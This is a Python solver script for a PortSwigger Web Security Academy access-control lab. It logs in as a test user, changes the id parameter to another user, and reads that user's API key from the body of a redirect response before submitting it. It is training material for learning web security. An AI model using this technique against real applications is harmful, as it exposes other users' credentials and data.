#!/usr/bin/env python3
"""
User ID controlled by request parameter with data leakage in redirect
PortSwigger Web Security Academy -- Access Control

Companion script for the writeup: 07-user-id-controlled-data-leakage-in-redirect.md

What this does:
    Uses a client with follow_redirects=False so the raw 3xx response to
    /my-account?id=carlos can be inspected instead of transparently
    followed. The redirect's Location points back at the homepage, but the
    response body attached to that same 3xx still contains the full account
    page markup -- API key included. Extracts the key from that redirect
    body and submits it with a second, normal client.

Usage:
    python 07-user-id-controlled-data-leakage-in-redirect.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def get_csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    api_key = None

    # Client that does NOT follow redirects, so the 3xx response body is readable.
    with httpx.Client(follow_redirects=False, timeout=15) as client:
        login_page = client.get(f"{lab_url}/login")
        csrf = get_csrf(login_page.text)
        resp = client.post(f"{lab_url}/login", data={"csrf": csrf, "username": "wiener", "password": "peter"})
        # Follow the login redirect manually to pick up the session cookie
        # without losing visibility into the account page's own redirect.
        if resp.status_code in (301, 302, 303):
            client.get(f"{lab_url}{resp.headers.get('location', '/my-account')}")

        resp = client.get(f"{lab_url}/my-account", params={"id": "carlos"})
        print(f"[*] /my-account?id=carlos: {resp.status_code}")
        print(f"[*] Body length: {len(resp.text)}")

        key_match = re.search(r'Your API key is:\s*([a-zA-Z0-9]+)', resp.text)
        if not key_match:
            key_match = re.search(r'API [Kk]ey[^<]*?([a-zA-Z0-9]{20,})', resp.text)

        if key_match:
            api_key = key_match.group(1)
            print(f"[+] Carlos API key (from redirect body): {api_key}")

    if not api_key:
        print("[-] Could not extract API key from the redirect body.")
        return

    # Normal client for the submission -- it doesn't need the same inspection.
    with httpx.Client(follow_redirects=True, timeout=15) as client:
        login_page = client.get(f"{lab_url}/login")
        csrf = get_csrf(login_page.text)
        client.post(f"{lab_url}/login", data={"csrf": csrf, "username": "wiener", "password": "peter"})

        resp = client.post(f"{lab_url}/submitSolution", data={"answer": api_key})
        print(f"[*] Submitted: {resp.status_code}")

        check = client.get(lab_url)
        if "Congratulations" in check.text:
            print("[+] Lab solved -- API key leaked in the redirect body.")
        else:
            print("[-] Not solved yet -- confirm the extracted API key.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
